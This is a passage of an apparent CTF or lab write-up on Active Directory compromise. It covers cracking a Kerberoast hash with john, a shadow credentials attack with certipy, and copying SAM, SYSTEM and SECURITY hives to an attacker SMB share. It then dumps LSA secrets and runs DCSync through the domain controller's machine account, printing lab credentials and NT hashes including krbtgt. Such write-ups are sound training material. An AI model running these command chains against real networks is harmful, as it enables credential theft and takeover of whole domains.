e752e9450eeea00eac37d3350c126194df2a344ad8209af334e116fafc5040aeb4e0f0dff4119f8c3d54a50fa52f38c55c071</span>  
</code></pre></div></div>

<p>attempting to crack it will lead us to cracking the password!</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">mustafa</span><span class="p">.</span><span class="n">txt</span>  
  
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>  
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">TGS</span> <span class="n">etype</span> <span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span><span class="p">])</span>  
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>  
<span class="n">Press</span> <span class="s">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>  
<span class="n">whybackup88</span>      <span class="p">(</span><span class="err">?</span><span class="p">)</span>     <span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">30</span> <span class="mi">08</span><span class="p">:</span><span class="mi">50</span><span class="p">)</span> <span class="mf">0.6060</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="n">whyband</span><span class="p">..</span><span class="n">whosline18</span>  
<span class="n">Use</span> <span class="n">the</span> <span class="s">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>  
<span class="n">Session</span> <span class="n">completed</span><span class="p">.</span>   
</code></pre></div></div>

<h3 id="shadow-credentials-attack">Shadow Credentials Attack</h3>

<p>Its not out of the norm for targetedkerberoasting not work too, since some users might have very strong &amp; complex passwords. Hence we will move towards shadow credentials incase the password doesn’t crack</p>

<p>Active Directory user and computer objects include an <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute where public keys can be stored, when enabling PKINIT pre-authentication the KDC validates that a user possesses the corresponding private key before issuing a TGT. If an attacker gains permissions to modify another object’s <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code>—for example, via group membership or elevated ACEs—they can inject their own public key and thereafter authenticate as that account, granting them persistent, stealthy access to the target.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali ~&gt; certipy shadow auto <span class="nt">-u</span> abdullah.azooz@albalad.bsides.rv <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> <span class="nt">-account</span> mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>  
  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'mustafa.yaseen'</span> with the certificate  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: mustafa.yaseen@albalad.bsides.rv  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'mustafa.yaseen.ccache'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>: 409a45a42c916885ac56127bebf06225  
</code></pre></div></div>

<h3 id="group-enumeration">Group Enumeration</h3>

<p>Using this hash we can authenticate as this user and we could see that this user is a member of backup operators.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD <span class="nt">--host</span> 10.2.10.11 <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'mustafa.yaseen'</span>  <span class="nt">-p</span> <span class="s1">':409a45a42c916885ac56127bebf06225'</span> get membership mustafa.yaseen  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-32-545sAMAccountName: Users  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Backup Operators,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Domain Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
</code></pre></div></div>

<h2 id="retrieving-domain-admin-hashes-through-dcsync">Retrieving Domain Admin hashes through DCSync</h2>
<h3 id="transfering-the-files-over">Transfering the files over</h3>
<p>To minimize our footprint we are going to dump the SAM, SYSTEM &amp; SECURITY on our attack box by first setting up an SMB Server</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py sawyer <span class="nb">.</span> <span class="nt">-smb2supportImpacket</span> v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.2.10.11,61022<span class="o">)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>DC01<span class="o">)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC01<span class="se">\ </span>authenticated successfully  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:sawyer<span class="o">)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>albalad<span class="se">\D</span>C01<span class="nv">$,</span>DC01<span class="o">)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC01<span class="se">\D</span>C01<span class="nv">$ </span>authenticated successfully  
  
</code></pre></div></div>
<p>then dumping it to that remote location</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup <span class="nt">-o</span> <span class="s1">'\\\\198.51.100.2\\sawyer\\'</span>Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
<span class="o">[!]</span> Cannot check RemoteRegistry status. Triggering start trough named pipe...  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>AM to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SAM.save  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>YSTEM to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SYSTEM.save  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>ECURITY to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SECURITY.save  
</code></pre></div></div>

<p>So now we can dump everything locally!, Lets first start by dumping the SAM</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">sam</span> <span class="s">'SAM.save'</span> <span class="o">-</span><span class="n">system</span> <span class="s">'SYSTEM.save'</span> <span class="n">LOCAL</span>  
  
  
<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">13.0</span><span class="p">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20250307.160229</span><span class="p">.</span><span class="mf">6e0</span><span class="n">a969</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>   
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x6f5fdaf97f208b1c48ab1cf9d83438e6</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">local</span> <span class="n">SAM</span> <span class="n">hashes</span> <span class="p">(</span><span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>  
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">f993698383cc8dc572e8abae5f71c7a1</span><span class="p">:::</span>  
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>  
<span class="n">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="p">...</span>   
</code></pre></div></div>

<p>To no avail we dont get the Domain administrator hashes, Now we move on to dumping the SYSTEM</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">system</span> <span class="n">SYSTEM</span><span class="p">.</span><span class="n">save</span> <span class="o">-</span><span class="n">security</span> <span class="n">SECURITY</span><span class="p">.</span><span class="n">save</span> <span class="n">LOCAL</span>  
  
  
<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">13.0</span><span class="p">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20250307.160229</span><span class="p">.</span><span class="mf">6e0</span><span class="n">a969</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>   
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x6f5fdaf97f208b1c48ab1cf9d83438e6</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">cached</span> <span class="n">domain</span> <span class="n">logon</span> <span class="n">information</span> <span class="p">(</span><span class="n">domain</span><span class="o">/</span><span class="n">username</span><span class="p">:</span><span class="nb">hash</span><span class="p">)</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">LSA</span> <span class="n">Secrets</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span> <span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span><span class="p">:</span><span class="n">plain_password_hex</span><span class="p">:</span><span class="mi">4</span><span class="n">aaf8d9f90d8d0f7883dc7cfb66d12be1f2d0af130e910936432190b52e40af7faa85a3b26df315dfff4ef9eb716d1d2c204c4631e16b46bed985114edb735cca5c32b008ab75a2287624a46a75e0369d961974c961fc41f7d542fe4e83db5b1f656e5b7e093e6d457c83b208cfdd6f743683de652bddf46af04936d963ccefa897ab427a3f6deb39bf2acfb302ddeff2e5366d566587a47b0203aa0f28a17a8677e22acbf8073e73ba16cf46a23f49e7f7263c98828ad86323f6c3a8a2e1131e4012b31badc0482ff0650023c6fcc8a8ed76fe3b128f3e674391a405a87154393ecfa30e09e3de5a5da40951506ad9c</span>  
<span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">7</span><span class="n">b22f222a57d771b33826a805543acb8</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DefaultPassword</span> <span class="p">(</span><span class="n">Unknown</span> <span class="n">User</span><span class="p">):</span><span class="n">password</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DPAPI_SYSTEM</span> <span class="n">dpapi_machinekey</span><span class="p">:</span><span class="mh">0x7e469d12fc010a93951d262c8dcc2678e6410dbd</span>  
<span class="n">dpapi_userkey</span><span class="p">:</span><span class="mh">0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NL</span><span class="err">$</span><span class="n">KM</span>   
 <span class="mi">0000</span>   <span class="mi">51</span> <span class="mi">96</span> <span class="n">B6</span> <span class="n">B9</span> <span class="mi">3</span><span class="n">C</span> <span class="n">B8</span> <span class="mi">5</span><span class="n">C</span> <span class="mi">4</span><span class="n">C</span>  <span class="mi">2</span><span class="n">D</span> <span class="n">D2</span> <span class="n">C4</span> <span class="n">C4</span> <span class="mi">36</span> <span class="mi">9</span><span class="n">D</span> <span class="mi">42</span> <span class="mi">68</span>   <span class="n">Q</span><span class="p">...</span><span class="o">&lt;</span><span class="p">.</span>\<span class="n">L</span><span class="o">-</span><span class="p">...</span><span class="mf">6.</span><span class="n">Bh</span>  
 <span class="mi">0010</span>   <span class="mi">13</span> <span class="mi">75</span> <span class="n">A8</span> <span class="mi">9</span><span class="n">F</span> <span class="mi">53</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">78</span> <span class="n">E4</span>  <span class="mi">98</span> <span class="n">C8</span> <span class="mi">18</span> <span class="mi">24</span> <span class="mi">5</span><span class="n">A</span> <span class="n">CF</span> <span class="mi">1</span><span class="n">B</span> <span class="mi">7</span><span class="n">B</span>   <span class="p">.</span><span class="n">u</span><span class="p">..</span><span class="n">S</span><span class="p">.</span><span class="n">x</span><span class="p">....</span><span class="err">$</span><span class="n">Z</span><span class="p">..{</span> <span class="mi">0020</span>   <span class="mi">3</span><span class="n">C</span> <span class="mi">97</span> <span class="n">C8</span> <span class="mi">68</span> <span class="mi">49</span> <span class="n">C4</span> <span class="mi">95</span> <span class="mi">6</span><span class="n">F</span>  <span class="n">AB</span> <span class="n">BB</span> <span class="n">A1</span> <span class="n">FB</span> <span class="mi">50</span> <span class="mi">2</span><span class="n">A</span> <span class="mi">6</span><span class="n">F</span> <span class="mi">8</span><span class="n">D</span>   <span class="o">&lt;</span><span class="p">..</span><span class="n">hI</span><span class="p">..</span><span class="n">o</span><span class="p">....</span><span class="n">P</span><span class="o">*</span><span class="n">o</span><span class="p">.</span> <span class="mi">0030</span>   <span class="n">C4</span> <span class="mi">43</span> <span class="mi">0</span><span class="n">D</span> <span class="n">CC</span> <span class="mi">8</span><span class="n">F</span> <span class="mi">6</span><span class="n">D</span> <span class="mi">47</span> <span class="mi">7</span><span class="n">C</span>  <span class="mi">19</span> <span class="n">CC</span> <span class="n">B5</span> <span class="n">E8</span> <span class="mi">1</span><span class="n">E</span> <span class="mi">55</span> <span class="mi">2</span><span class="n">F</span> <span class="n">AC</span>   <span class="p">.</span><span class="n">C</span><span class="p">...</span><span class="n">mG</span><span class="o">|</span><span class="p">.....</span><span class="n">U</span><span class="o">/</span><span class="p">.</span><span class="n">NL</span><span class="err">$</span><span class="n">KM</span><span class="p">:</span><span class="mi">5196</span><span class="n">b6b93cb85c4c2dd2c4c4369d42681375a89f538d78e498c818245acf1b7b3c97c86849c4956fabbba1fb502a6f8dc4430dcc8f6d477c19ccb5e81e552fac</span>  
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="p">...</span>   
</code></pre></div></div>

<h3 id="dcsync-through-machine-account">DCSync through machine account</h3>
<p>Through Dumping the SYSTEM we can use the DC account to perform DCSync!, This is because the machine account always has permissions to DCSync itself</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py albalad.bsides.rv/DC01<span class="se">\$</span>@10.2.10.11 <span class="nt">-hashes</span> <span class="s1">':7b22f222a57d771b33826a805543acb8'</span>Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f1a374289ceae1e89cc103a9986c2b2:::  
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
User:1104:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
Admin:1105:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
albalad.bsides.rv<span class="se">\a</span>hmad.al.satooh:1107:aad3b435b51404eeaad3b435b51404ee:8d181b680d2f46ace51c9f3f5720a60d:::  
albalad.bsides.rv<span class="se">\o</span>mar.heshnat:1108:aad3b435b51404eeaad3b435b51404ee:ad515ff94211034e7d6b5584c4ab8221:::  
</code></pre></div></div>



<script>
    function toggleToc() {
        const content = document.getElementById('tocContent');
        const button = document.querySelector('.toc-toggle');
        
        if (content.classList.contains('expanded')) {
            content.classList.remove('expanded');
            button.classList.remove('expanded');
            button.innerHTML = 'Table of Contents';
        } else {
            content.classList.add('expanded');
            button.classList.add('expanded');
            button.innerHTML = 'Table of Contents';
        }
    }
</script>

      </section>
      <footer>
        
        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
        
        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
      </footer>
    </div>
    <script src="/assets/js/scale.fix.js"></script>
  </body>
</html>
